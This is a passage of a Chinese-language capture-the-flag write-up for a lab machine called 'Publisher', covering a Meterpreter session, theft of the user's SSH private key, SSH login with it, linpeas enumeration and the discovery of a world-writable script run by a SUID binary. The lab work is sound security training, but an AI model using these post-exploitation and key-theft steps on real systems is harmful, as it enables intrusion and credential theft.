class=\"hljs-number\"\u003e11\u003c/span\u003e:hugetlb:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2\n\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e:cpu,cpuacct:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2\n\u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e:perf_event:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2\n\u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e:devices:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2\n\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e:blkio:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2\n\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e:memory:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2\n\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e:freezer:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2\n\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e:net_cls,net_prio:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2\n\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e:pids:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2\n\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e:rdma:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2\n\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e:name=systemd:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2\n\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e::/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e不过可以注意到，我们的\u003ccode\u003espip\u003c/code\u003e是放在一个叫\u003ccode\u003ethink\u003c/code\u003e的用户家目录下，果然有权限访问\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emeterpreter \u003e ls\nListing: /home/think\n====================\n\nMode              Size  \u003cspan class=\"hljs-type\"\u003eType\u003c/span\u003e  Last modified              Name\n----              ----  ----  -------------              ----\n020666/rw-rw-rw-  \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e     cha   \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-01-\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e51\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e44\u003c/span\u003e -0500  .bash_history\n\u003cspan class=\"hljs-number\"\u003e100644\u003c/span\u003e/rw-r--r--  \u003cspan class=\"hljs-number\"\u003e220\u003c/span\u003e   fil   \u003cspan class=\"hljs-number\"\u003e2023\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e 03:\u003cspan class=\"hljs-number\"\u003e57\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e -0500  .bash_logout\n\u003cspan class=\"hljs-number\"\u003e100644\u003c/span\u003e/rw-r--r--  \u003cspan class=\"hljs-number\"\u003e3771\u003c/span\u003e  fil   \u003cspan class=\"hljs-number\"\u003e2023\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e 03:\u003cspan class=\"hljs-number\"\u003e57\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e -0500  .bashrc\n040700/rwx------  \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e  \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e2023\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e 03:\u003cspan class=\"hljs-number\"\u003e57\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e -0500  .cache\n040700/rwx------  \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e  \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e2023\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e-08 08:07:\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e -0500  .config\n040700/rwx------  \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e  \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-02-\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e -0500  .gnupg\n040775/rwxrwxr-x  \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e  \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-01-\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e 07:\u003cspan class=\"hljs-number\"\u003e46\u003c/span\u003e:09 -0500  .local\n\u003cspan class=\"hljs-number\"\u003e100644\u003c/span\u003e/rw-r--r--  \u003cspan class=\"hljs-number\"\u003e807\u003c/span\u003e   fil   \u003cspan class=\"hljs-number\"\u003e2023\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e 03:\u003cspan class=\"hljs-number\"\u003e57\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e -0500  .profile\n020666/rw-rw-rw-  \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e     cha   \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-01-\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e51\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e44\u003c/span\u003e -0500  .python_history\n040755/rwxr-xr-x  \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e  \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-01-\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e 07:\u003cspan class=\"hljs-number\"\u003e54\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e -0500  .ssh\n020666/rw-rw-rw-  \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e     cha   \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-01-\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e51\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e44\u003c/span\u003e -0500  .viminfo\n040750/rwxr-x---  \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e  \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e2023\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:05:\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e -0500  spip\n\u003cspan class=\"hljs-number\"\u003e100644\u003c/span\u003e/rw-r--r--  \u003cspan class=\"hljs-number\"\u003e35\u003c/span\u003e    fil   \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-02-\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e39\u003c/span\u003e -0500  user.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e注意到SSH文件夹，我们查看一下是否有SSH密钥\u003c/p\u003e\n\u003cp\u003e存在，我们将其下载下来\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emeterpreter \u003e ls\nListing: /home/think/.ssh\n=========================\n\nMode              Size  \u003cspan class=\"hljs-type\"\u003eType\u003c/span\u003e  Last modified              Name\n----              ----  ----  -------------              ----\n\u003cspan class=\"hljs-number\"\u003e100644\u003c/span\u003e/rw-r--r--  \u003cspan class=\"hljs-number\"\u003e569\u003c/span\u003e   fil   \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-01-\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e 07:\u003cspan class=\"hljs-number\"\u003e54\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e -0500  authorized_keys\n\u003cspan class=\"hljs-number\"\u003e100644\u003c/span\u003e/rw-r--r--  \u003cspan class=\"hljs-number\"\u003e2602\u003c/span\u003e  fil   \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-01-\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e 07:\u003cspan class=\"hljs-number\"\u003e48\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e -0500  id_rsa\n\u003cspan class=\"hljs-number\"\u003e100644\u003c/span\u003e/rw-r--r--  \u003cspan class=\"hljs-number\"\u003e569\u003c/span\u003e   fil   \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-01-\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e 07:\u003cspan class=\"hljs-number\"\u003e48\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e -0500  id_rsa.pub\n\nmeterpreter \u003e download id_rsa\n[*] Downloading: id_rsa -\u003e /root/Desktop/test/Publisher/id_rsa\n[*] Downloaded \u003cspan class=\"hljs-number\"\u003e2.54\u003c/span\u003e KiB of \u003cspan class=\"hljs-number\"\u003e2.54\u003c/span\u003e KiB (\u003cspan class=\"hljs-number\"\u003e100.0\u003c/span\u003e%): id_rsa -\u003e /root/Desktop/test/Publisher/id_rsa\n[*] Completed  : id_rsa -\u003e /root/Desktop/test/Publisher/id_rsa\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eSSH密钥利用\u003c/h3\u003e\n\u003cp\u003e设置密钥权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003echmod \u003cspan class=\"hljs-number\"\u003e600\u003c/span\u003e id_rsa\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用密钥登录\u003ccode\u003eSSH\u003c/code\u003e，登陆成功\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003essh think@\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e -i id_rsa                                                                                                                        \nThe authenticity of host \u003cspan class=\"hljs-string\"\u003e'192.168.56.11 (192.168.56.11)'\u003c/span\u003e can\u003cspan class=\"hljs-string\"\u003e't be established.                                                                               \nED25519 key fingerprint is SHA256:Ndgax/DOZA6JS00F3afY6VbwjVhV2fg5OAMP9TqPAOs.                                                                               \nThis key is not known by any other names.                                     \nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWelcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-169-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Mon 20 Jan 2025 09:08:28 PM UTC\n\n  System load:                      0.07\n  Usage of /:                       74.7% of 9.75GB\n  Memory usage:                     32%\n  Swap usage:                       0%\n  Processes:                        211\n  Users logged in:                  0\n  IPv4 address for br-72fdb218889f: 172.18.0.1\n  IPv4 address for docker0:         172.17.0.1\n  IPv4 address for enp0s3:          192.168.56.11\n\nExpanded Security Maintenance for Applications is not enabled.\n\n0 updates can be applied immediately.\n\nEnable ESM Apps to receive additional future security updates.\nSee https://ubuntu.com/esm or run: sudo pro status\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\n\nLast login: Fri Mar 29 13:22:11 2024 from 192.168.109.1\nthink@publisher:~$ \n\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eUserFlag\u003c/h3\u003e\n\u003cp\u003e查看当前文件夹，存在\u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ethink@publisher:~$ cat user.txt \nfa229046d44eda6a3598c73ad96f4ca5\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e自动化信息收集\u003c/h3\u003e\n\u003cp\u003e向靶机传入\u003ccode\u003elinpeas.sh\u003c/code\u003e ，使用\u003ccode\u003ekali\u003c/code\u003e创建服务器然后下载到靶机\u003c/p\u003e\n\u003cp\u003e给予\u003ccode\u003elinpeas.sh\u003c/code\u003e 执行权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ethink@publisher:~$ chmod u+x [linpeas.sh](http://linpeas.sh/)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e执行\u003ccode\u003elinpeas.sh\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ethink@publisher:~$ ./[linpeas.sh](http://linpeas.sh/)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e结果说可能存在\u003ccode\u003eCVE-2021-3560\u003c/code\u003e  ，但是几个POC都无法使用\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eVulnerable to CVE-\u003cspan class=\"hljs-number\"\u003e2021\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e3560\u003c/span\u003e                                                                                                                                  \n                                                                                                                                                             \n╔══════════╣ Protections                                                                                                                                     \n═╣ AppArmor enabled? .............. You do \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e have enough privilege to read the profile \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e.                                                                apparmor module \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e loaded.                                                                                                                                   \n═╣ AppArmor profile? .............. /usr/sbin/ash (complain)                                                                                                 \n═╣ \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e linuxONE? ................... s390x Not Found                                                                                                          \n═╣ grsecurity present? ............ grsecurity Not Found                                                                                                     \n═╣ PaX bins present? .............. PaX Not Found       \n═╣ grsecurity present? ............ grsecurity Not Found                                                                                 08:\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e [\u003cspan class=\"hljs-number\"\u003e1503\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e1808\u003c/span\u003e]\n═╣ PaX bins present? .............. PaX Not Found                                                                                                            \n═╣ Execshield enabled? ............ Execshield Not Found                                                                                                     \n═╣ SELinux enabled? ............... sestatus Not Found                                                                                                       \n═╣ Seccomp enabled? ............... disabled                                                                                                                 \n═╣ User namespace? ................ enabled                                                                                                                  \n═╣ Cgroup2 enabled? ............... enabled                                                                                                                  \n═╣ Is ASLR enabled? ............... Yes                                                                                                                      \n═╣ Printer? ....................... No                                                                                                                       \n═╣ Is this a virtual machine? ..... Yes (oracle)    \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e结果中还发现存在一个未知二进制文件 \u003ccode\u003e/usr/sbin/run_container\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e══════════════════════╣ Files \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e Interesting Permissions ╠══════════════════════                                                                           \n                      ╚════════════════════════════════════╝                                                                                                 \n╔══════════╣ SUID - Check easy privesc, exploits \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e write perms                                                                                             \n╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html\u003cspan class=\"hljs-comment\"\u003e#sudo-and-suid                                                              \u003c/span\u003e\n-rwsr-xr-x \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root 23K Feb \u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2022\u003c/span\u003e /usr/lib/policykit-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e/polkit-agent-helper-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e                                                                           \n-rwsr-xr-x \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root 467K Dec \u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2023\u003c/span\u003e /usr/lib/openssh/ssh-keysign                                                                                        \n-rwsr-xr-x \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root 15K Jul  \u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e /usr/lib/eject/dmcrypt-get-device                                                                                    \n-rwsr-xr-- \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root messagebus 51K Oct \u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2022\u003c/span\u003e /usr/lib/dbus-\u003cspan class=\"hljs-number\"\u003e1.0\u003c/span\u003e/dbus-daemon-launch-helper                                                                    \n-rwsr-sr-x \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root 15K Dec \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2023\u003c/span\u003e /usr/lib/xorg/Xorg.wrap                                                                                              \n-rwsr-xr-- \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root dip 386K Jul \u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e /usr/sbin/pppd  ---\u003e  Apple_Mac_OSX_10\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.8\u003c/span\u003e(05-\u003cspan class=\"hljs-number\"\u003e2007\u003c/span\u003e)                                                                  \n-rwsr-sr-x \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root 17K Nov \u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2023\u003c/span\u003e /usr/sbin/run_container (Unknown SUID binary!)                                                                       \n-rwsr-sr-x \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e daemon daemon 55K Nov \u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2018\u003c/span\u003e /usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/at  ---\u003e  RTru64_UNIX_4\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003eg(CVE-\u003cspan class=\"hljs-number\"\u003e2002\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e1614\u003c/span\u003e)                                                               \n-rwsr-xr-x \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root 39K Mar  \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e /usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/fusermount                                                                                                  \n-rwsr-xr-x \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root 87K Nov \u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2022\u003c/span\u003e /usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/gpasswd                                                                                                     \n-rwsr-xr-x \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root 84K Nov \u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2022\u003c/span\u003e /usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/chfn  ---\u003e  SuSE_9\u003cspan class=\"hljs-number\"\u003e.3\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e                                                                                     \n-rwsr-xr-x \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root 163K Apr  \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2023\u003c/span\u003e /usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/sudo  ---\u003e  check_if_the_sudo_version_is_vulnerable                                                        \n-rwsr-xr-x \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root 52K Nov \u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2022\u003c/span\u003e /usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/chsh                                                                                                        \n-rwsr-xr-x \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root 67K Nov \u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2022\u003c/span\u003e /usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/passwd  ---\u003e  Apple_Mac_OSX(03-\u003cspan class=\"hljs-number\"\u003e2006\u003c/span\u003e)/Solaris_8/\u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e(\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e2004\u003c/span\u003e)/SPARC_8/\u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e/Sun_Solaris_2\u003cspan class=\"hljs-number\"\u003e.3\u003c/span\u003e_to_2\u003cspan class=\"hljs-number\"\u003e.5\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e(02-\u003cspan class=\"hljs-number\"\u003e1997\u003c/span\u003e)       \n-rwsr-xr-x \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root 55K May \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2023\u003c/span\u003e /usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/mount  ---\u003e  Apple_Mac_OSX(Lion)_Kernel_xnu-\u003cspan class=\"hljs-number\"\u003e1699.32\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.7\u003c/span\u003e_except_xnu-\u003cspan class=\"hljs-number\"\u003e1699.24\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.8\u003c/span\u003e                                  \n-rwsr-xr-x \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root 67K May \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2023\u003c/span\u003e /usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/su                                                                                                          \n-rwsr-xr-x \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root 44K Nov \u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2022\u003c/span\u003e /usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/newgrp  ---\u003e  HP-UX_10\u003cspan class=\"hljs-number\"\u003e.20\u003c/span\u003e                                                                                   \n-rwsr-xr-x \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root 31K Feb \u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2022\u003c/span\u003e /usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/pkexec  ---\u003e  Linux4\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e_to_5\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.17\u003c/span\u003e(CVE-\u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e13272\u003c/span\u003e)/rhel_6(CVE-\u003cspan class=\"hljs-number\"\u003e2011\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e1485\u003c/span\u003e)/Generic_CVE-\u003cspan class=\"hljs-number\"\u003e2021\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e4034\u003c/span\u003e               \n-rwsr-xr-x \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root 39K May \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2023\u003c/span\u003e /usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/umount  ---\u003e  BSD/Linux(08-\u003cspan class=\"hljs-number\"\u003e1996\u003c/span\u003e)         \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用\u003ccode\u003estrings\u003c/code\u003e查看\u003ccode\u003erun_container\u003c/code\u003e 关键字\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e/lib64/ld-linux-x86-\u003cspan class=\"hljs-number\"\u003e64.\u003c/span\u003eso\u003cspan class=\"hljs-number\"\u003e.2\u003c/span\u003e\nlibc.so\u003cspan class=\"hljs-number\"\u003e.6\u003c/span\u003e\n__stack_chk_fail           \nexecve                        \n__cxa_finalize     \n__libc_start_main\nGLIBC_2\u003cspan class=\"hljs-number\"\u003e.2\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.5\u003c/span\u003e   \nGLIBC_2\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e   \n_ITM_deregisterTMCloneTable\n__gmon_start__ \n_ITM_registerTMCloneTable\nu+UH                 \n[]A\\A]A^A_                                                                                                                                                   \n/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/bash                                                                                                                                                    \n/opt/run_container.sh                                                                                                                                        \n:*\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e$\u003cspan class=\"hljs-string\"\u003e\"                                                                                                                                                        \nGCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0                                                                                                                   \ncrtstuff.c                                                                                                                                                   \nderegister_tm_clones                                                                                                                                         \n__do_global_dtors_aux                                                                                                                                        \ncompleted.8061                                                                                                                                               \n__do_global_dtors_aux_fini_array_entry                                                                                                                       \nframe_dummy                                                                                                                                                  \n__frame_dummy_init_array_entry                                                                                                                               \nrun_container.c                                                                                                                                              \n__FRAME_END__                                                                                                                                                \n__init_array_end                                                                                                                                             \n_DYNAMIC                                                                                                                                                     \n__init_array_start                                                                                                                                           \n__GNU_EH_FRAME_HDR                    \n_GLOBAL_OFFSET_TABLE_                                                         \n__libc_csu_fini                                                               \n_ITM_deregisterTMCloneTable\n_edata   \n__stack_chk_fail@@GLIBC_2.4\n__libc_start_main@@GLIBC_2.2.5\nexecve@@GLIBC_2.2.5\n__data_start     \n__gmon_start__\n__dso_handle\n_IO_stdin_used             \n__libc_csu_init\n__bss_start              \nmain   \n__TMC_END__                                                                                                                                                  \n_ITM_registerTMCloneTable                                                                                                                                    \n__cxa_finalize@@GLIBC_2.2.5                                                                                                                                  \n.symtab                                                                                                                                                      \n.strtab                                                                                                                                                      \n.shstrtab                                                                                                                                                    \n.interp                                                                                                                                                      \n.note.gnu.property                                                                                                                                           \n.note.gnu.build-id                                                                                                                                           \n.note.ABI-tag                                                                                                                                                \n.gnu.hash                                                                                                                                                    \n.dynsym                                                                                                                                                      \n.dynstr                                                                                                                                                      \n.gnu.version                                                                                                                                                 \n.gnu.version_r                                                                                                                                               \n.rela.dyn                                                                                                                                                    \n.rela.plt                                                                                                                                                    \n.init                                 \n.plt.got                                                                      \n.plt.sec                                                                      \n.text                      \n.fini    \n.rodata                    \n.eh_frame_hdr                 \n.eh_frame          \n.init_array      \n.fini_array   \n.dynamic    \n.data                      \n.bss           \n.comment  \n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e发现关键字 \u003ccode\u003e/opt/run_container.sh\u003c/code\u003e  \u003ccode\u003e/lib64/ld-linux-x86-64.so.2\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e应该是 \u003ccode\u003erun_container\u003c/code\u003e 会执行\u003ccode\u003erun_container.sh\u003c/code\u003e ，看看\u003ccode\u003erun_container.sh\u003c/code\u003e 是否有修改权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ethink@publisher:/usr/lib64$ ls -al /opt/run_container.sh\n-rwxrwxrwx \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e1715\u003c/span\u003e Mar \u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e 